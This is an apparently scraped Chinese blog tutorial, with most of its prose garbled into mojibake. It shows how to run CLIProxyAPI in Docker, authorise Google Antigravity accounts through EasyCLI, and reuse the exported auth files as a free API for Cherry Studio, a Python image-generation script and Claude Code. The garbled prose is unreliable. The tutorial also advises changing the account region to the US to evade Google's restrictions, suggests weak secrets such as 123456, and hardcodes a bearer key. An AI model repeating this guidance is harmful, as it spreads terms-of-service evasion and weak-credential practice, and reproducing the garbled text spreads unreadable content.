<p>ç¨‹åºå¯åŠ¨éœ€è¦config.yamlä¸ªé…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨ä¸‹é¢å‘½åå¤åˆ¶</p>
<pre><code class="hljs language-shell" lang="shell">cp config.example.yaml config.yaml
</code></pre>
<p>window ä¸Šç›´æ¥å¤åˆ¶ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1780dcc909d49ff85b20c057e176907~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=sHBgb4tD0ttGnc5KOcBWjZsS%2Ff0%3D" alt="image-20260102161456379" loading="lazy"/></p>
<p>è®°ä¸‹æ¥æˆ‘ä»¬ç¼–è¾‘ä¸€ä¸‹config.yamlï¼Œä¸»è¦æ˜¯ä¿®æ”¹api-keysã€remote-management.allow-remoteã€secret-key</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85033de3d58a49a09ec0d1a869029583~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=NoGf7eW5HCdPLljNcWEoD4MVp70%3D" alt="image-20260102161732676" loading="lazy"/></p>
<p>å‚è€ƒä¸Šé¢çš„è®¾ç½®å³å¯ã€‚å…¶ä¸­secret-key ä¸»è¦æ˜¯åé¢å¯åŠ¨ç™»å½•çš„è´¦å·ï¼Œå¯ä»¥è®¾ç½®æ¯”è¾ƒç®€å•çš„123456ç­‰ç­‰ã€‚ç³»ç»Ÿä¼šåŠ å¯†ï¼Œä¸ç”¨ç®¡ä¸Šé¢æˆªå›¾ä¿¡æ¯ã€‚</p>
<h3 data-id="heading-4">ä¸‹è½½å®¹å™¨é•œåƒ</h3>
<p>è¿™é‡Œè€ƒè™‘åˆ°éƒ¨ç½²æ–¹ä¾¿ï¼Œæˆ‘ä»¬ä½¿ç”¨docker å®¹å™¨éƒ¨ç½²ã€‚è¾“å…¥ä¸‹é¢çš„å‘½ä»¤ä¸‹è½½æœ€æ–°çš„é•œåƒï¼Œæˆ‘ç”µè„‘å®‰è£…äº†wslï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨linuxè¿è¡Œç¯å¢ƒæ¥éƒ¨ç½²è¿™ä¸ªç¨‹åº</p>
<pre><code class="hljs language-bash" lang="bash">docker pull eceasy/cli-proxy-api:v6.6.77
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0cd2f12219941d89eb178775f22aec4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=xpJeQHocwZQcXueqq63eRfW14tQ%3D" alt="image-20260102162021582" loading="lazy"/></p>
<h3 data-id="heading-5">å¯åŠ¨æœåŠ¡</h3>
<p>é•œåƒä¸‹è½½å®Œæˆåï¼Œæˆ‘ä»¬è¾“å…¥ä¸‹é¢å‘½ä»¤å¯åŠ¨å®¹å™¨</p>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
  -p 8317:8317 \
  -v ./config.yaml:/CLIProxyAPI/config.yaml \
  -v ./auths:/root/.cli-proxy-api \
  eceasy/cli-proxy-api:latest
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08c3499c20634d12bbf0c36e681e2eef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=UEpwwJEGTOw1i96cOsm2qs4NQmY%3D" alt="image-20260102162322713" loading="lazy"/></p>
<p>å¯åŠ¨å®Œæˆåæˆ‘ä»¬å¯ä»¥åœ¨å®¹å™¨ç¯å¢ƒæŸ¥çœ‹åˆ°8317æœåŠ¡ç«¯å£å¯åŠ¨</p>
<h3 data-id="heading-6">éªŒè¯</h3>
<p>ç¨‹åºå¯åŠ¨å®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥ä¸‹é¢åœ°å€éªŒè¯ä¸€ä¸‹æœåŠ¡æ˜¯å¦å¯ä»¥è®¿é—®</p>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8317%2Fmanagement.html" target="_blank" title="http://localhost:8317/management.html" ref="nofollow noopener noreferrer">http://localhost:8317/management.html</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb591be3d1534794be1305110ac8f90b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=trpvGIffOkoTMJ693YWT3JvDBQs%3D" alt="image-20260102162600200" loading="lazy"/></p>
<p>çœ‹åˆ°ä¸Šé¢çš„é¡µé¢ è¯´æ˜æœåŠ¡ç«¯æ˜¯å¯ä»¥ä½¿ç”¨çš„ã€‚æˆ‘ä»¬è¾“å…¥ç®¡ç†å‘˜ç§˜é’¥ï¼Œè¿™ç®¡ç†å‘˜ç§˜é’¥å°±æ˜¯æˆ‘ä»¬ä¸Šé¢æˆªå›¾è®¾ç½®çš„</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c409b43ffc4a439b8ea199a92a430bd8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=0KJvQ5BLaHvgCNTgmZBIe6vQF3w%3D" alt="image-20260102162633417" loading="lazy"/></p>
<p>è´¦å·ç§˜é’¥ã€‚è¾“å…¥å¯†ç åç‚¹å‡»ç™»å½•æŒ‰é’®å®Œæˆç™»å½•</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f65ecda7d044349860660b207dc21b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=zi5wAqcnXS8sJk26s2vKqUPkqzI%3D" alt="image-20260102162733906" loading="lazy"/></p>
<p>é€šè¿‡ä»¥ä¸Šæ–¹å¼æˆ‘ä»¬å°±å®Œæˆäº†CLIProxyAPIç¨‹åºçš„éƒ¨ç½²ã€‚è§£ææˆ‘ä»¬éœ€è¦åœ¨å®‰è£…<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frouter-for-me%2FEasyCLI" target="_blank" title="https://github.com/router-for-me/EasyCLI" ref="nofollow noopener noreferrer">EasyCLI</a> è¿™ä¸ªå­é¡¹ç›®</p>
<h3 data-id="heading-7">EasyCLIå®‰è£…</h3>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬åœ¨githubä¸Šæ‰¾åˆ°è¿™ä¸ªEasyCLIé¡¹ç›®ï¼Œå¹¶ä¸‹è½½å®ƒçš„å®‰è£…åŒ…ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7fe0dcbe104f4688a7e5c285fecc84d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=LZ2KeGAW8hJ5DujAMwnhyh75ZZo%3D" alt="image-20260102163212399" loading="lazy"/></p>
<p>æˆ‘è¿™é‡Œå°±é‚£windowsä¸ºæ¡ˆä¾‹ï¼Œä¸‹è½½åç›´æ¥è§£å‹æ‰“å¼€å³å¯ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f5d3ad835454a4d8ac939999701a50e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=knBz0LdzlGEKLaYC7IWDPH7j2OM%3D" alt="image-20260102163324353" loading="lazy"/></p>
<p>åŒå‡»æ‰“å¼€åæˆ‘ä»¬é€‰æ‹©è¿œç¨‹ã€‚è¾“å…¥è¯·æ±‚åœ°å€å’Œå¯†ç </p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8197b7d53ebb4eef8c8b38227c8381bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=732yVIoFacbi5snNoj1cSTpPrzY%3D" alt="image-20260102163500250" loading="lazy"/></p>
<p>â€‹     è¿™ä¸ªåœ°å€å’Œè´¦å·å¯†ç å…¶å®å°±æ˜¯ä¸Šé¢çš„CLIProxyAPI åç«¯ç®¡ç†è´¦å·å’Œå¯†ç ã€‚ç™»å½•æˆåŠŸåè¿›å…¥EasyCLIåå°ç®¡ç†</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c31bd5999604df28399b4743e95d23e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=X%2FDqHK2rIilxaz01xOgdcKVb3Mg%3D" alt="image-20260102163549385" loading="lazy"/></p>
<p>ç­‰åæˆ‘ä»¬é€‰æ‹©authentication files ï¼Œç„¶ååœ¨å³ä¸‹è§’new æŒ‰é’®ç‚¹å‡»Antigravity</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9daa1ae012a640398c4d6972597bfa81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=2HF%2FQCi6w5qzTdkYD3UbAJpomtE%3D" alt="image-20260102163717376" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ffe01365b49a49bf91490a303d72f769~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=X7J%2B7dhCFRdEo9t4ABMpassAOY8%3D" alt="image-20260102163900386" loading="lazy"/></p>
<h3 data-id="heading-8">Google Antigravityâ€ æˆæƒ</h3>
<p>ç‚¹å‡»open linkæ‰“å¼€google æˆæƒ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6688842daeda43848fcbf4e571a7f2a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=kSK79j0q2fE3Ai1qjK1HoXtfUPY%3D" alt="image-20260102164001648" loading="lazy"/></p>
<p>å› ä¸ºæˆ‘æµè§ˆå™¨ä¹‹å‰è®°å½•2ä¸ªgoogle çš„è´¦å·ï¼Œæ‰€ä»¥æˆ‘è¿™è¾¹ç‚¹å‡»æˆæƒã€‚å¼¹å‡ºâ€œGoogle Antigravityâ€ æˆæƒé¡µé¢ï¼Œç‚¹å‡»ç™»å½•æŒ‰é’®</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fee4bc9dad64f30b40e7a59c220e052~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=BXwpuf%2Fpx7Gzr6GP84dT5Bq2PgM%3D" alt="image-20260102164054542" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d04b8c5eadc8432181a6137363fd75d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=bZl%2B01Frec5v0yElJV%2FD5mJS5LQ%3D" alt="image-20260102164140365" loading="lazy"/></p>
<p>å®Œæˆæˆæƒã€‚</p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ç”±äºGoogle çš„é™åˆ¶ï¼Œæˆ‘ä»¬éœ€è¦æŠŠè‡ªå·±çš„å›½å®¶å’Œåœ°åŒºæ”¹æˆéä¸­å›½åœ°åŒºï¼ˆåŒ…æ‹¬é¦™æ¸¯ï¼‰ï¼Œå»ºè®®ç›´æ¥æ”¹ç¾å›½ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fpolicies.google.com%2Fterms%3Fhl%3Dzh_CN" target="_blank" title="https://policies.google.com/terms?hl=zh_CN" ref="nofollow noopener noreferrer">policies.google.com/terms?hl=zhâ€¦</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef13aac01e0e4ff48ccfc00502c47849~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=InbdTc%2F59vbaGVyuf4uR7l5%2BfcA%3D" alt="image-20260102164542133" loading="lazy"/></p>
<h3 data-id="heading-9">ä¸‹è½½æˆæƒæ–‡ä»¶å¹¶å¯¼å…¥</h3>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬æŠŠåˆšæ‰æˆæƒåº—2ä¸ªjsonæ–‡æ¡£ä¸‹è½½å¹¶å¯¼å‡ºã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62bea2d961394b17a34e28a035f05c24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=ewmz82zbqswQRpsZ7%2B0FCyo6BHo%3D" alt="image-20260102164805971" loading="lazy"/></p>
<p>å›åˆ°CLIProxyAPI åå°ç®¡ç†ç•Œé¢ï¼Œæˆ‘ä»¬åœ¨è®¤è¯æ–‡ä»¶å¯¼å…¥2ä¸ªæ–‡ä»¶</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e609d686a554942aff2d3ad30138dba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=KdBZqCFWYqWvB5PXaxqdF%2FCaQJk%3D" alt="image-20260102164919438" loading="lazy"/></p>
<p>é€šè¿‡ä¸Šé¢çš„æ–¹å¼æˆ‘ä»¬çš„CLIProxyAPI åå¸¦å°±é…ç½®å®Œæˆäº†ã€‚æˆ‘ç‚¹å‡»å…¶ä¸­ä¸€ä¸ªè´¦å·æ¨¡å‹è¯¦ç»†ä¿¡æ¯å¯ä»¥çœ‹åˆ°å¯ä»¥ä½¿ç”¨çš„æ¨¡å‹</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/753c95da154c440c9688bbc735eb87c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=%2F3wMK9G0Ab7gvd7oUnFSPEYOYWA%3D" alt="image-20260102165028401" loading="lazy"/></p>
<h2 data-id="heading-10">3.ç¬¬ä¸‰æ–¹å¹³å°ä½¿ç”¨</h2>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥åœ¨ç¬¬ä¸‰æ–¹å¹³å°ä¸Šä½¿ç”¨è€…è¿™ä¸ªå…è´¹çš„åå¸¦API äº†</p>
<h3 data-id="heading-11">cherry stuido</h3>
<p>æˆ‘ä»¬ä½¿ç”¨cherry stuido è¿™ä¸ªç¬¬ä¸‰æ–¹å·¥å…·æ¥æµ‹è¯•éªŒè¯ä¸€ä¸‹åå¸¦çš„æ•ˆæœã€‚</p>
<p>æˆ‘ä»¬å…ˆåœ¨cherry stuidoé…ç½®ä¸€ä¸‹</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee5dcd04f1184531bb74b8dc1dbdff6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=CtYd3EsLE9BiAElskLS88Pr3rfQ%3D" alt="image-20260102165427041" loading="lazy"/></p>
<p>å¡«å†™apiç§˜é’¥ï¼Œè¿™ç§˜é’¥å°±æ˜¯ä¸Šé¢æˆ‘ä»¬åœ¨conf.yamlé…ç½®çš„api-keysçš„ç§˜é’¥</p>
<p>apiåœ°å€ æˆ‘ä»¬å¡«å†™æœ¬åœ°åœ°å€<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8317" target="_blank" title="http://localhost:8317" ref="nofollow noopener noreferrer">http://localhost:8317</a>  ï¼ˆå¦‚æœè¿œç¨‹éƒ¨ç½²å¯ä»¥å¡«å†™è¿œç¨‹æœåŠ¡å™¨åœ°å€ï¼‰</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/caddfce0a20b4a64aa7502cf90293092~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=GVtIYfuGFDae2as7n7PNbZpzyxo%3D" alt="image-20260102165609680" loading="lazy"/></p>
<p>â€‹      ä»¥ä¸Šæˆ‘ä»¬å°±å®Œæˆäº†æ¨¡å‹åŸºæœ¬è®¾ç½®ã€‚</p>
<p>â€‹      æ¥ä¸‹æ¥æˆ‘ä»¬åœ¨èŠå¤©å¯¹è¯ä¸­éªŒè¯æµ‹è¯•</p>
<p>â€‹      é€‰æ‹©gemini-3-flash-preview</p>
<p>â€‹      <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77a6a1bbd78e4acdb5062b6e582b8adc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=lBLG4UsObMK8ORqK1t%2FeAFQLBCM%3D" alt="image-20260102165821634" loading="lazy"/></p>
<p>â€‹       é€‰æ‹©gemini-3-pro-image-previewæ¨¡å‹ å¯ä»¥ç”Ÿå›¾ï¼ˆè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„nano banana proï¼‰</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5918466d8a274357aeaf77a92cd48830~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=wMMVf%2Fw3KVbC9BtrYXwrzTVhFTA%3D" alt="image-20260102165745631" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a84ceeeb91b407f88a76ca737e7a79a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=6xnq9pYjXd04msidqeiiwriTwhM%3D" alt="image-20260102170351317" loading="lazy"/></p>
<h3 data-id="heading-12">ä½¿ç”¨ä»£ç å®ç°</h3>
<p>â€‹    è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨pythonæ¥å®ç°è¿™ä¸ªæ¥å£è°ƒç”¨ï¼Œæˆ‘ä»¬è¿™é‡Œå°±æ–‡ç”Ÿå›¾æ¥å£æµ‹è¯•</p>
<p>testgemini-3-pro-image-preview.py</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> re

url = <span class="hljs-string">"http://localhost:8317/v1/chat/completions"</span>

payload = json.dumps({
   <span class="hljs-string">"model"</span>: <span class="hljs-string">"gemini-3-pro-image-preview"</span>,
   <span class="hljs-string">"messages"</span>: [
      {
         <span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>,
         <span class="hljs-string">"content"</span>: [
            {
               <span class="hljs-string">"type"</span>: <span class="hljs-string">"text"</span>,
               <span class="hljs-string">"text"</span>: <span class="hljs-string">"2ä¸ªèƒèŸ¹åœ¨æ‰“æ¶"</span>
            }
         ]
      }
   ]
})
headers = {
   <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">'Bearer sk_zhouhuizhou'</span>,
   <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
}

<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ­£åœ¨å‘é€è¯·æ±‚..."</span>)
response = requests.request(<span class="hljs-string">"POST"</span>, url, headers=headers, data=payload)

<span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
    res_text = response.text
    <span class="hljs-comment"># å°è¯•åŒ¹é… base64 æ¨¡å¼</span>
    <span class="hljs-comment"># æ¨¡å¼ 1: data:image/xxx;base64,xxxx</span>
    pattern1 = <span class="hljs-string">r'base64,([A-Za-z0-9+/=]{50,})'</span>
    match1 = re.search(pattern1, res_text)
    
    base64_str = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> match1:
        base64_str = match1.group(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># æ¨¡å¼ 2: JSON å­—æ®µä¸­çš„é•¿å­—ç¬¦ä¸² (å‡è®¾æ˜¯ base64)</span>
        <span class="hljs-keyword">try</span>:
            res_data = response.json()
            content = res_data.get(<span class="hljs-string">'choices'</span>, [{}])[<span class="hljs-number">0</span>].get(<span class="hljs-string">'message'</span>, {}).get(<span class="hljs-string">'content'</span>, <span class="hljs-string">''</span>)
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(content, <span class="hljs-built_in">list</span>):
                <span class="hljs-comment"># å¤„ç†åˆ—è¡¨å½¢å¼çš„ content</span>
                <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> content:
                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(item, <span class="hljs-built_in">dict</span>):
                        text = item.get(<span class="hljs-string">'text'</span>, <span class="hljs-string">''</span>)
                        <span class="hljs-keyword">if</span> <span class="hljs-string">'base64,'</span> <span class="hljs-keyword">in</span> text:
                            base64_str = text.split(<span class="hljs-string">'base64,'</span>)[<span class="hljs-number">1</span>].strip()
                            <span class="hljs-keyword">break</span>
                        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(text) &gt; <span class="hljs-number">100</span>: <span class="hljs-comment"># å¯èƒ½æ˜¯çº¯ base64</span>
                            base64_str = text.strip()
                            <span class="hljs-keyword">break</span>
            <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(content, <span class="hljs-built_in">str</span>):
                <span class="hljs-keyword">if</span> <span class="hljs-string">'base64,'</span> <span class="hljs-keyword">in</span> content:
                    base64_str = content.split(<span class="hljs-string">'base64,'</span>)[<span class="hljs-number">1</span>].strip()
                <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(content) &gt; <span class="hljs-number">100</span>:
                    base64_str = content.strip()
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">pass</span>

    <span class="hljs-keyword">if</span> base64_str:
        <span class="hljs-comment"># æ¸…ç†å¯èƒ½å­˜åœ¨çš„å¼•å·æˆ–è½¬ä¹‰å­—ç¬¦</span>
        base64_str = base64_str.split(<span class="hljs-string">'"'</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">'\\'</span>)[<span class="hljs-number">0</span>].strip()
        
        <span class="hljs-keyword">try</span>:
            image_data = base64.b64decode(base64_str)
            output_filename = <span class="hljs-string">"output_crab_fight.png"</span>
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_filename, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:
                f.write(image_data)
            
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å›¾ç‰‡å·²æˆåŠŸä¿å­˜ï¼"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ–‡ä»¶è·¯å¾„: <span class="hljs-subst">{os.path.abspath(output_filename)}</span>"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ‰€åœ¨ç›®å½•: <span class="hljs-subst">{os.path.dirname(os.path.abspath(output_filename))}</span>"</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è§£ç å›¾ç‰‡å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"æœªåœ¨å“åº”ä¸­è¯†åˆ«åˆ° base64 æ•°æ®ã€‚"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"å“åº”å‰ 500 å­—ç¬¦:"</span>, res_text[:<span class="hljs-number">500</span>])
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è¯·æ±‚å¤±è´¥ï¼ŒçŠ¶æ€ç : <span class="hljs-subst">{response.status_code}</span>"</span>)
    <span class="hljs-built_in">print</span>(response.text)

</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94dcd36a33e24416ab0588839a2d2400~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=MRT32orqZdpwjPnFLA9dUOEK5YU%3D" alt="image-20260102172730956" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f29a252948034653abe7839d8f7a0e91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=sbHxPWqyIreKkq5LcxaMFp4t3DI%3D" alt="image-20260102172756805" loading="lazy"/></p>
<p>æˆ‘ä»¬é€šè¿‡ä»£ç ä¹Ÿå®ç°äº†æ–‡ç”Ÿå›¾è°ƒç”¨Antigravityå®ç°ç”Ÿå›¾åŠŸèƒ½äº†</p>
<h3 data-id="heading-13">claude code</h3>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨æœ¬åœ°claude code æ¥å®ç°ã€‚è¿™é‡Œé…ç½®æˆ‘ä»¬ä½¿ç”¨cc-switché…ç½®ã€‚å…³äºcc-switché…ç½® é…ç½®ä¸ç†Ÿæ‚‰çš„å¯ä»¥çœ‹æˆ‘ä¹‹å‰çš„æ–‡ç« </p>
<p>ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FxuwAwfZZiYzKhnPVrvitug" target="_blank" title="https://mp.weixin.qq.com/s/xuwAwfZZiYzKhnPVrvitug" ref="nofollow noopener noreferrer">CC-Switché…ç½®åˆ‡æ¢ç¥å™¨ï¼š5ç§’æå®šå¤šè®¾å¤‡åŒæ­¥ï¼Œåšæœäº‘è®©é…ç½®æ°¸ä¸ä¸¢å¤±</a>ã€‹</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8216234b5635452b807749877aacf40d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=lOOzk8AWRjaG2KrjOkdK9MRgSBA%3D" alt="image-20260102173424243" loading="lazy"/></p>
<p>cc-switchå®Œæˆåï¼Œæˆ‘ä»¬å¯åŠ¨æœ¬åœ°claud code</p>
